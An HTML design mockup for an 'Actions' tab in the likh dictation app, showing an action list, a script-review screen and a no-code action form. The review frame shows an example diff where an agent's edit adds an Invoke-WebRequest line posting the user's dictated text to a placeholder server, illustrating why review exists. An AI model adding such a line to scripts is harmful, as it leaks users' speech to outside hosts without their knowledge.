@@ -1,0 +1,238 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<title>Actions tab, mockup</title>
+<style>
+  :root {
+    /* Page chrome follows the reader's scheme. The window tokens are likh's, always dark (BRAND.md). */
+    --page: #f6f5f3; --ink: #1d1c1a; --ink-muted: #5c5955; --rule: #dedad4;
+    --bg: oklch(0.155 0.012 275); --side: oklch(0.175 0.013 275); --surface: oklch(0.19 0.014 275); --elevated: oklch(0.225 0.016 275);
+    --text: oklch(0.945 0.006 275); --text-muted: oklch(0.72 0.012 275); --text-subtle: oklch(0.56 0.014 275);
+    --accent: oklch(0.78 0.11 45); --on-accent: oklch(0.22 0.03 45);
+    --success: oklch(0.78 0.13 155); --warning: oklch(0.84 0.14 85); --danger: oklch(0.68 0.17 25);
+    --edge: oklch(1 0 0 / 0.06); --edge-strong: oklch(1 0 0 / 0.14); --hover: oklch(1 0 0 / 0.06);
+    --font: "Geist", ui-sans-serif, system-ui, "Segoe UI", sans-serif;
+    --mono: "Geist Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root { --page: oklch(0.155 0.012 275); --ink: oklch(0.945 0.006 275); --ink-muted: oklch(0.74 0.012 275); --rule: oklch(1 0 0 / 0.1); }
+  }
+  * { box-sizing: border-box; }
+  html { background: var(--page); }
+  body { margin: 0; background: var(--page); color: var(--ink); font: 400 17px/1.5 var(--font); -webkit-font-smoothing: antialiased; }
+  main { max-width: 800px; margin: 0 auto; padding: 48px 24px 64px; }
+  h1 { font-size: 34px; line-height: 1.15; letter-spacing: -0.02em; margin: 0 0 8px; }
+  h2 { font-size: 22px; line-height: 1.3; margin: 48px 0 8px; }
+  p { margin: 0 0 12px; max-width: 62ch; }
+  .lede { color: var(--ink-muted); }
+  ol.ask { max-width: 62ch; padding-left: 22px; margin: 16px 0 0; }
+  ol.ask li { margin-bottom: 8px; }
+  code { font: 500 0.88em var(--mono); }
+
+  /* The settings window at its real size: 720 x 580, sidebar 184. */
+  .win { width: 720px; height: 580px; display: flex; border-radius: 16px; overflow: hidden; background: var(--bg); color: var(--text);
+    font: 400 15px/22px var(--font); box-shadow: 0 0 0 1px var(--rule), 0 16px 40px oklch(0 0 0 / 0.25); margin-top: 16px; }
+  .side { width: 184px; flex: none; background: var(--side); padding: 22px 16px 16px; display: flex; flex-direction: column; }
+  .brand { display: flex; align-items: center; gap: 8px; font-weight: 600; margin: 0 0 32px 12px; }
+  .brand i { display: inline-block; width: 3px; border-radius: 2px; background: var(--accent); margin-right: 1px; }
+  .nav { display: flex; align-items: center; gap: 12px; height: 33px; padding: 0 12px; border-radius: 10px; color: var(--text-muted); font: 500 13px/18px var(--font); }
+  .nav.on { background: var(--hover); color: var(--text); }
+  .nav svg { flex: none; color: var(--text-muted); }
+  .nav.on svg { color: var(--accent); }
+  .ver { margin-top: auto; padding-left: 12px; font: 500 12px/16px var(--mono); color: var(--text-subtle); }
+  .body { flex: 1; position: relative; padding: 24px 24px 0 32px; overflow: hidden; }
+  .body::after { content: ""; position: absolute; left: 0; right: 0; bottom: 0; height: 32px; background: linear-gradient(transparent, var(--bg)); }
+  .head { display: flex; align-items: center; justify-content: space-between; height: 40px; margin-bottom: 24px; }
+  .title { font: 600 20px/26px var(--font); letter-spacing: -0.01em; display: flex; align-items: center; gap: 8px; }
+  .x { color: var(--text-muted); }
+  .panel { background: var(--surface); border: 1px solid var(--edge); border-radius: 12px; }
+  .row { display: flex; align-items: center; gap: 16px; padding: 12px 16px; }
+  .row + .row { border-top: 1px solid var(--edge); }
+  .grow { flex: 1; min-width: 0; }
+  .name { font: 500 15px/22px var(--font); }
+  .sub { font: 400 13px/18px var(--font); color: var(--text-muted); }
+  .what { font: 500 12px/16px var(--mono); color: var(--text-subtle); }
+  .line { display: flex; align-items: center; gap: 8px; margin-top: 6px; flex-wrap: wrap; }
+  .cap { font: 400 13px/18px var(--font); border: 1px solid var(--edge-strong); border-radius: 13px; padding: 3px 11px; white-space: nowrap; }
+  .cap em { font-style: normal; color: var(--accent); }
+  .key { font: 500 12px/16px var(--mono); background: var(--elevated); border-radius: 6px; padding: 4px 8px; box-shadow: inset 0 1px 0 oklch(1 0 0 / 0.08); }
+  .btn { font: 500 13px/18px var(--font); border-radius: 10px; padding: 7px 14px; background: var(--elevated); color: var(--text); white-space: nowrap; }
+  .btn.primary { background: var(--accent); color: var(--on-accent); }
+  .btn.quiet { background: none; color: var(--text-muted); padding: 7px 8px; }
+  .tog { flex: none; width: 34px; height: 20px; border-radius: 10px; background: var(--accent); position: relative; }
+  .tog::after { content: ""; position: absolute; right: 3px; top: 3px; width: 14px; height: 14px; border-radius: 7px; background: var(--on-accent); }
+  .tog.off { background: var(--hover); }
+  .tog.off::after { left: 3px; right: auto; background: var(--text-subtle); }
+  .dot { display: inline-block; width: 8px; height: 8px; border-radius: 4px; flex: none; }
+  .warn-txt { color: var(--text); font: 400 13px/18px var(--font); }
+  .label { display: flex; align-items: center; justify-content: space-between; margin: 24px 0 8px; }
+  .label span { font: 500 13px/18px var(--font); color: var(--text-muted); padding-left: 16px; }
+  .label div { display: flex; gap: 8px; }
+
+  /* Review */
+  .diff { margin: 0; background: var(--bg); border-radius: 8px; padding: 8px 0; font: 500 12px/20px var(--mono); color: var(--text-muted); overflow: hidden; }
+  .diff div { padding: 0 12px; white-space: pre-wrap; overflow-wrap: anywhere; }
+  .diff .add { background: oklch(0.78 0.13 155 / 0.12); color: var(--text); }
+  .diff .del { background: oklch(0.68 0.17 25 / 0.14); color: var(--text-muted); text-decoration: line-through; text-decoration-color: oklch(0.68 0.17 25 / 0.6); }
+  .kv { display: grid; grid-template-columns: 72px 1fr; gap: 6px 12px; font: 400 13px/18px var(--font); }
+  .kv b { font-weight: 500; color: var(--text-muted); }
+  .foot { display: flex; justify-content: flex-end; gap: 8px; margin-top: 16px; align-items: center; }
+  .foot .what { margin-right: auto; }
+
+  /* Form */
+  .field { background: var(--bg); border: 1px solid var(--edge-strong); border-radius: 10px; padding: 7px 12px; font: 400 15px/22px var(--font); }
+  .field.area { font-size: 13px; line-height: 18px; color: var(--text); }
+  .seg { display: inline-flex; background: var(--bg); border-radius: 10px; padding: 3px; gap: 2px; }
+  .seg span { font: 500 13px/18px var(--font); color: var(--text-muted); padding: 5px 10px; border-radius: 7px; white-space: nowrap; }
+  .seg span.on { background: var(--elevated); color: var(--text); box-shadow: 0 1px 2px oklch(0 0 0 / 0.2); }
+  .frow { display: grid; grid-template-columns: 92px 1fr; gap: 12px; align-items: start; padding: 10px 16px; }
+  .frow + .frow { border-top: 1px solid var(--edge); }
+  .frow > b { font: 500 13px/18px var(--font); color: var(--text-muted); padding-top: 8px; }
+  .checks { display: flex; gap: 16px; font: 400 13px/18px var(--font); padding-top: 7px; }
+  .checks span { display: flex; align-items: center; gap: 6px; color: var(--text-muted); }
+  .checks span.on { color: var(--text); }
+  .box { width: 14px; height: 14px; border-radius: 4px; border: 1px solid var(--edge-strong); display: grid; place-items: center; }
+  .on .box { background: var(--accent); border-color: var(--accent); }
+  figcaption { margin-top: 12px; font-size: 15px; line-height: 1.45; color: var(--ink-muted); max-width: 62ch; }
+  @media (max-width: 760px) { .win { zoom: 0.62; } }
+  @media (max-width: 420px) { .win { zoom: 0.5; } }
+  details { margin-top: 40px; border-top: 1px solid var(--rule); padding-top: 4px; max-width: 62ch; }
+  summary { cursor: pointer; font-weight: 600; padding: 12px 0; }
+  details ul { padding-left: 20px; }
+</style>
+</head>
+<body>
+<main>
+  <h1>A seventh tab for your actions</h1>
+  <p class="lede">Actions sits after Commands: the built-in phrases there, yours here. It lists each action as its files say, flags the broken and the changed, and makes the simple ones without code.</p>
+  <ol class="ask">
+    <li>Should Review show what changed since you approved it? likh would keep a copy of each approved script. I'd say yes.</li>
+    <li>Should each action have its own switch, saved in its file as <code>enabled = false</code>? I'd say yes.</li>
+    <li>Should the action key live on this tab, not on Dictation? I'd say yes.</li>
+  </ol>
+
+  <h2>The list</h2>
+  <figure style="margin:0">
+    <div class="win">
+      <div class="side">
+        <div class="brand"><span><i style="height:7px"></i><i style="height:13px"></i><i style="height:9px"></i><i style="height:13px"></i><i style="height:7px"></i></span>likh</div>
+        <div class="nav"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"><rect x="5.5" y="1.5" width="5" height="8" rx="2.5"/><path d="M3 7.5a5 5 0 0 0 10 0M8 12.5v2"/></svg>Dictation</div>
+        <div class="nav"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"><path d="M2 8h.01M5 5.5v5M8 3v10M11 5.5v5M14 8h.01"/></svg>Transcription</div>
+        <div class="nav"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4.5 4 1.5 8l3 4M11.5 4l3 4-3 4M9.5 2.5l-3 11"/></svg>Commands</div>
+        <div class="nav on"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1.5c.5 3.4 1.6 4.5 5 5-3.4.5-4.5 1.6-5 5-.5-3.4-1.6-4.5-5-5 3.4-.5 4.5-1.6 5-5Z"/></svg>Actions</div>
+        <div class="nav"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round"><path d="M8 4c-1.5-1.2-3.5-1.5-6-1.5v10c2.5 0 4.5.3 6 1.5 1.5-1.2 3.5-1.5 6-1.5v-10c-2.5 0-4.5.3-6 1.5Zm0 0v10"/></svg>Dictionary</div>
+        <div class="nav"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"><circle cx="8" cy="8" r="6.2"/><path d="M8 4.5V8l2.3 1.6"/></svg>History</div>
+        <div class="nav"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"><circle cx="8" cy="8" r="2.4"/><path d="M8 1.5v1.6M8 12.9v1.6M1.5 8h1.6M12.9 8h1.6M3.4 3.4l1.1 1.1M11.5 11.5l1.1 1.1M3.4 12.6l1.1-1.1M11.5 4.5l1.1-1.1"/></svg>App</div>
+        <div class="ver">v0.1.0-alpha.10</div>
+      </div>
+      <div class="body">
+        <div class="head"><div class="title">Actions</div><span class="x">✕</span></div>
+        <div class="panel">
+          <div class="row">
+            <div class="grow"><div class="name">Action key</div><div class="sub">Hold it and say what to do. Nothing you say is typed.</div></div>
+            <span class="key">Ctrl</span><span class="key">Shift</span><span class="key">Space</span><span class="btn">Change</span>
+          </div>
+        </div>
+        <div class="label"><span>Your actions</span><div><span class="btn quiet">Open folder</span><span class="btn primary">New action</span></div></div>
+        <div class="panel">
+          <div class="row">
+            <div class="grow"><div class="name">Make this formal</div><div class="line"><span class="cap">“make this <em>{style}</em>”</span><span class="what">ask, replace the selection</span></div></div>
+            <span class="tog"></span>
+          </div>
+          <div class="row">
+            <div class="grow"><div class="name">New T3 thread</div><div class="line"><span class="cap">“new thread <em>{text}</em>”</span><span class="what">open t3code://new</span></div></div>
+            <span class="tog"></span>
+          </div>
+          <div class="row">
+            <div class="grow"><div class="name">Deploy preview</div><div class="line"><span class="dot" style="background:var(--warning)"></span><span class="warn-txt">deploy.ps1 changed. Approve it to run.</span></div></div>
+            <span class="btn">Review</span>
+          </div>
+          <div class="row">
+            <div class="grow"><div class="name">Run tests</div><div class="line"><span class="dot" style="background:var(--danger)"></span><span class="what" style="color:var(--text-muted)">run-tests.toml:7 unknown step “runn”</span></div></div>
+            <span class="btn">Open file</span>
+          </div>
+          <div class="row">
+            <div class="grow"><div class="name">Open a site</div><div class="line"><span class="cap">“open <em>{site}</em>”</span><span class="what">github, docs, mail</span></div></div>
+            <span class="tog off"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+    <figcaption>Peach marks the open tab, the one primary button and the slots you fill by voice. Amber means "waiting on you", red means "broken". Each row does what its file says; the list fades at the edge like History.</figcaption>
+  </figure>
+
+  <h2>Approving a changed script</h2>
+  <figure style="margin:0">
+    <div class="win">
+      <div class="side">
+        <div class="brand"><span><i style="height:7px"></i><i style="height:13px"></i><i style="height:9px"></i><i style="height:13px"></i><i style="height:7px"></i></span>likh</div>
+        <div class="nav">Dictation</div><div class="nav">Transcription</div><div class="nav">Commands</div>
+        <div class="nav on">Actions</div><div class="nav">Dictionary</div><div class="nav">History</div><div class="nav">App</div>
+        <div class="ver">v0.1.0-alpha.10</div>
+      </div>
+      <div class="body">
+        <div class="head"><div class="title"><span style="color:var(--text-muted)">‹</span>Deploy preview</div><span class="x">✕</span></div>
+        <div class="panel" style="padding:16px">
+          <div class="name">deploy.ps1 changed after you approved it</div>
+          <div class="sub" style="margin-bottom:12px">Approved Oct 12. Edited today at 14:02. Two lines added, one removed.</div>
+          <div class="diff">
+            <div>$branch = git branch --show-current</div>
+            <div class="del">vercel deploy --prebuilt</div>
+            <div class="add">vercel deploy --prebuilt --yes</div>
+            <div class="add">Invoke-WebRequest https://hooks.example.dev -Method Post -Body $env:LIKH_TEXT</div>
+            <div>Write-Output "Preview is up for $branch"</div>
+          </div>
+          <div class="kv" style="margin-top:16px">
+            <b>Runs</b><span class="what" style="color:var(--text)">pwsh -NoProfile -File deploy.ps1</span>
+            <b>Reads</b><span>What you said after the phrase</span>
+            <b>Result</b><span>Shown in the pill</span>
+          </div>
+        </div>
+        <div class="foot"><span class="what">actions\deploy-preview.toml</span><span class="btn quiet">Not now</span><span class="btn primary">Approve</span></div>
+      </div>
+    </div>
+    <figcaption>The reason Review exists: an agent's edit added a line that posts what you say to a server. You see exactly that line before it can run.</figcaption>
+  </figure>
+
+  <h2>Making one without code</h2>
+  <figure style="margin:0">
+    <div class="win">
+      <div class="side">
+        <div class="brand"><span><i style="height:7px"></i><i style="height:13px"></i><i style="height:9px"></i><i style="height:13px"></i><i style="height:7px"></i></span>likh</div>
+        <div class="nav">Dictation</div><div class="nav">Transcription</div><div class="nav">Commands</div>
+        <div class="nav on">Actions</div><div class="nav">Dictionary</div><div class="nav">History</div><div class="nav">App</div>
+        <div class="ver">v0.1.0-alpha.10</div>
+      </div>
+      <div class="body">
+        <div class="head"><div class="title"><span style="color:var(--text-muted)">‹</span>New action</div><span class="x">✕</span></div>
+        <div class="panel">
+          <div class="frow"><b>Name</b><div class="field">Make this formal</div></div>
+          <div class="frow"><b>When I say</b><div><div class="line" style="margin-top:4px"><span class="cap">“make this <em>{style}</em>”</span><span class="btn quiet">Add phrase</span></div><div class="sub" style="margin-top:4px">A slot in braces catches the words you say there.</div></div></div>
+          <div class="frow"><b>Do</b><div class="seg"><span>Paste text</span><span>Open</span><span>Press keys</span><span class="on">Ask ChatGPT</span></div></div>
+          <div class="frow"><b>Prompt</b><div class="field area">Rewrite the selected text in a <span style="color:var(--accent)">{style}</span> tone. Keep its meaning and its language.</div></div>
+          <div class="frow"><b>Uses</b><div class="checks"><span class="on"><span class="box"></span>Selected text</span><span><span class="box"></span>Clipboard</span><span><span class="box"></span>App name</span></div></div>
+          <div class="frow"><b>Result</b><div class="seg"><span class="on">Replace selection</span><span>Paste</span><span>Show in pill</span></div></div>
+        </div>
+        <div class="foot"><span class="what">saves actions\make-this-formal.toml</span><span class="btn quiet">Cancel</span><span class="btn primary">Save</span></div>
+      </div>
+    </div>
+    <figcaption>The form covers paste, open, keys and ask. Scripts and multi-step actions are files only; the form never shows them half-editable.</figcaption>
+  </figure>
+
+  <details>
+    <summary>What these frames follow, and what they skip</summary>
+    <ul>
+      <li>Real size: 720 × 580, sidebar 184, measured from <code>docs/brand/panel/*.png</code>. Panels, capsules, segmented picks and toggles copy the existing tabs.</li>
+      <li>The Actions icon is the spark you picked, in the sidebar's 16px stroke family.</li>
+      <li>Not shown: an empty state ("No actions yet"), the edit view for an existing simple action (the same form, filled in), and the Change flow for the action key (the Dictation tab's).</li>
+      <li>The brand's <code>text-subtle</code> (version, the mono "what it does" lines) measures about 4:1 on these surfaces, under the 4.5:1 the page check wants. The Commands tab already ships it that way.</li>
+      <li>HTML only, nothing built in iced yet.</li>
+    </ul>
+  </details>
+</main>
+<script>addEventListener("beforeprint", () => document.querySelectorAll("details").forEach(d => d.open = true));</script>
+</body>
+</html>
